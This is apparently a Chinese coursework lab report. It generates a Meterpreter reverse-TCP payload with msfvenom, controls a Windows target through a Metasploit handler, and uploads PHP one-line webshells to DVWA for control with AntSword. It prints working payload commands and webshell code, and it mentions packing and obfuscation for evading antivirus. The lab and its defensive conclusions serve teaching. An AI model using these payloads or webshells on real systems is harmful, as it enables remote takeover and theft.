---
title: Meterpreter 远程控制与一句话木马实验
date: 2026-11-04
categories:
  - 实验报告
tags:
  - Metasploit
  - Meterpreter
  - msfvenom
  - 微步云沙箱
  - 一句话木马
  - 蚁剑
permalink: meterpreter-webshell/
---

## 一、实验概述

远程控制程序（木马）按连接方式分为两类：**正向连接**（控制端主动连接被控端）和**反向连接**（被控端主动连接控制端）。反向连接能穿透 NAT 与防火墙限制，是目前木马的主流工作方式。

<!-- more -->

本实验对应课程作业的三个任务：

1. **PPT 9-10 复现**：用 msfvenom 生成反向连接的被控端（payload.exe），Kali 启动主控端，在靶机运行被控端后实现远程控制；
2. **微步云沙箱检测**：将生成的被控端提交到微步在线云沙箱（https://s.threatbook.com/）检测；
3. **一句话木马**：向目标网站写入一句话木马，用中国蚁剑连接并控制目标网站。

## 二、实验环境

| 角色 | 系统/工具 | 说明 |
|---|---|---|
| 主控端（攻击机） | Kali Linux | msfvenom 生成 payload、Metasploit 监听 |
| 被控端（靶机） | Windows（关闭杀毒软件/Defender） | 运行 payload.exe |
| 云沙箱 | 微步在线云沙箱 | 上传 payload.exe 检测 |
| Web 靶场 | 提供 PHP 环境的实验网站 | 写入一句话木马 |

## 三、生成被控端（msfvenom）

msfvenom 是 Metasploit 自带的 payload 生成器，一条命令即可生成指定平台、指定格式的恶意程序。

先用 ifconfig 确认攻击机（Kali）的 IP，本例为 192.168.247.128：

{% asset_img shot1.png 查看攻击机 IP %}

然后生成被控端：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.247.128 LPORT=5000 -f exe -o ~/payload.exe
```

参数说明：

- `-p`：指定 payload 类型。`windows/meterpreter/reverse_tcp` 是 Windows 平台的反向 Meterpreter 控制程序；
- `LHOST`：主控端（Kali）IP，被控端运行后会主动回连这个地址；
- `LPORT`：主控端监听的端口（本例 5000）；
- `-f exe`：输出格式为 Windows 可执行文件；
- `-o`：保存路径（本例 ~/payload.exe）。

生成成功后，把 payload.exe 拷贝到 Windows 靶机上（实验中由 Kali 起 HTTP 服务、靶机浏览器下载）。

## 四、启动主控端并控制被控端

在 Kali 上启动 Metasploit，使用 exploit/multi/handler 监听 5000 端口：

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.247.128
set LPORT 5000
run
```

{% asset_img shot2.png 启动 Metasploit 主控端 %}

监听建立后，在 Windows 靶机上双击运行 payload.exe。被控端立即回连主控端，Kali 中出现 Meterpreter 会话：

```bash
[*] Meterpreter session 1 opened (192.168.247.128:5000 -> 192.168.247.130:1047)
```

{% asset_img shot3.png Meterpreter 会话建立并查看靶机系统信息 %}

进入会话后即可控制靶机：

```bash
sessions -i 1     # 进入会话
sysinfo           # 查看靶机系统信息
getuid            # 查看当前用户
show_mount        # 查看靶机磁盘分区
screenshot        # 截取靶机屏幕
shell             # 获得靶机命令行
```

`sysinfo` 显示靶机为 Windows XP SP3（计算机名 WEN-CD5A8657927），`getuid` 显示当前会话以靶机登录用户身份运行：

{% asset_img shot4.png getuid 查看当前用户 %}

继续执行 `show_mount` 可以列出靶机磁盘：

{% asset_img shot5.png show_mount 查看靶机磁盘 %}

被控端的每次心跳与控制命令全部通过这条反向连接完成——靶机处于内网时依然有效，这正是反向连接的优点。

## 五、被控端提交微步云沙箱检测

在把 payload.exe 提交给微步云沙箱（https://s.threatbook.com/，需注册账号）之前，可以先用本地杀毒软件验证其恶意性。实验中 payload 在下载传输时就被火绒实时防护拦截：

{% asset_img shot6.png 火绒拦截 payload.exe 下载 %}

微步云沙箱检测流程：

1. 注册并登录微步在线云沙箱；
2. 上传 payload.exe；
3. 等待检测完成，查看检测报告。

检测报告中，payload.exe 会被标记为**恶意/木马**（如 Trojan/Win32 或 Generic 木马），并给出行为分析：创建进程、网络回连行为等。这说明常规的 msfvenom 生成的 payload 已被各大杀毒引擎入库，实战中需要做免杀处理（加壳、编码、混淆等）。

## 六、一句话木马与蚁剑控制

**原理**：一句话木马是最简洁的 Webshell，常见有两种形态。

**形态一（命令执行型）**，代码只有一行：

```php
<?php system($_REQUEST['cmd']);?>
```

- `system()`：PHP 函数，执行系统命令并输出结果；
- `$_REQUEST['cmd']`：获取 URL 参数 `cmd` 的值并交给 system 执行。

也就是说，访问者可以通过 URL 直接让服务器执行任意命令。

**写入**：将上述代码保存为 `shell.php`，通过靶场 DVWA 的文件上传功能写入 Web 目录（`/dvwa/hackable/uploads/`）。

**验证**：浏览器访问

```
http://192.168.247.129/dvwa/hackable/uploads/shell.php?cmd=/sbin/ifconfig
```

页面返回服务器的网络配置信息，说明木马生效：

{% asset_img shot7.png 浏览器访问一句话木马执行 ifconfig %}

**形态二（eval 型）**，同样只有一行：

```php
<?php @eval($_POST['cmd']);?>
```

`eval()` 直接执行 POST 参数中传入的 PHP 代码。蚁剑的 PHP 连接器默认向 eval 型木马发送代码执行请求，命令执行型木马接不住（表现为连接测试「返回数据为空」），因此实验中又上传了 `shell2.php`（eval 型）供蚁剑连接。

**蚁剑连接**：中国蚁剑（AntSword）是图形化的 Webshell 管理工具：

1. 打开蚁剑，添加数据：URL 填入 `http://192.168.247.129/dvwa/hackable/uploads/shell2.php`，连接密码填 `cmd`，测试连接成功后添加；
2. 在数据列表右键该连接 → 「虚拟终端」，即可执行命令、浏览与编辑服务器文件、上传下载等。

虚拟终端中执行 `/sbin/ifconfig` 成功返回网卡信息，当前用户为 `www-data`，说明已完全控制目标网站服务器：

{% asset_img shot8.png 蚁剑虚拟终端执行命令控制目标 %}

蚁剑将一句话木马的参数传递、结果回显封装成了图形界面，是 Webshell 权限维持阶段的常用工具。

## 七、总结

本次实验完成了远程控制与 Webshell 两条技术路线的实践：

- **Meterpreter 路线**：msfvenom 生成被控端 → 反向回连 → 主控端获得完整会话，展示了现代木马的「生成-投递-回连-控制」全流程；微步云沙箱的检测结果则说明公开 payload 已无免杀能力；
- **Webshell 路线**：命令执行型一句话木马完成浏览器验证，eval 型一句话木马配合蚁剑实现图形化管理，展示了 Web 应用被攻破后的权限维持方式。

防御视角的体会：一是终端侧要依靠杀软+沙箱联动拦截未知样本；二是 Web 侧要过滤上传文件、禁用危险函数（system、exec 等）、限制 Web 目录写权限；三是任何「入口」都不能轻视——一个可写的 Web 目录，一行 PHP 代码，就能让整个服务器被远程控制。
